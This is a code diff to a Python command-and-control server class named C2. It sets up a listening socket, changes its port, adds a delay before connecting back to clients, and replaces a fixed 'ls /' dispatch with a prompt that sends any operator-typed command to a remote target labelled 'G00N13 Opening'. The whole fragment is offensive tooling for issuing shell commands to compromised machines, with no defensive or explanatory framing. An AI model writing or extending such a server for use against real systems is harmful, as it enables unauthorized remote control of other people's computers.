@@ -92,7 +92,8 @@ class C2:
     def irs(self):
         # Start a socket
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server_socket.bind(('0.0.0.0', 23766))
+        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.server_socket.bind(('0.0.0.0', 23765))
         self.server_socket.listen(1)
 
         while True:
@@ -164,6 +165,7 @@ class C2:
                 if port_int >= 65536:
                     raise Exception("BRUH YOU TAKE 453???? FOH B")
                 
+                time.sleep(1)
                 print(f'[+] Connecting to client on port {port_int}...')
                 
                 # Connect to this port to notify to forward all of the notifications
@@ -175,8 +177,8 @@ class C2:
 def main():
     Server = C2()
     while True:
-        Server.dispatch(['G00N13 Opening'], "ls /")
-        time.sleep(30)
+        message = input('(dispatch) ')
+        Server.dispatch(['G00N13 Opening'], message)
 
 if __name__ == '__main__':
     main()
